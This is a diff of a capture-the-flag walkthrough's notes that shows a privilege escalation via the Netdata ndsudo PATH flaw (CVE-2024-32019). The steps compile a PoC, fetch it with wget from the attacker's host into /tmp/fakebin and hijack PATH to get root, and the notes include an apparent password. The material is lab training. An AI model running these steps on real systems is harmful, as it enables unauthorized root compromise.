@@ -40,27 +40,28 @@ Target:
 		theEd1t0rTeam99
 	
 --User to Root Access
-  Read the flag
-    cat user.txt
+	Read the flag
+		cat user.txt
+
 	Ignore the sh script that claims to gives root, it doesn't work
 	If you run id you can see you are part of a Netdata group
 	researching netdata vulns CVE-2024-32019 comes up, and a very detailed exploit POC comes up as well
-	  https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
+  	https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
 	
-	You have to manually compile the script on your host since there is no gcc
-	  gcc poc.c -o nvme
+	You have to manually compile the script on your host since there is no GCC on the target
+		gcc poc.c -o nvme
 	Then host it with a Python HTTP server 
-    python3 -m http.server 80
+	    python3 -m http.server 80
 	And download the file to the target in the /tmp directory 
-    cd /tmp/fakebin
-    wget http://(your host ip):80/nvme
-  Following the PoC instructions to get root
-    chmod +x /tmp/fakebin/nvme
-    export PATH=/tmp/fakebin:$PATH
-    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+	    cd /tmp/fakebin
+	    wget http://(your host ip):80/nvme
+	Following the PoC instructions to get root
+	    chmod +x /tmp/fakebin/nvme
+	    export PATH=/tmp/fakebin:$PATH
+	    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 
 	You should now have root 
 -Root
-  Read the flag
-    cat root.txt
-    
+	Read the flag
+		cat root.txt
+
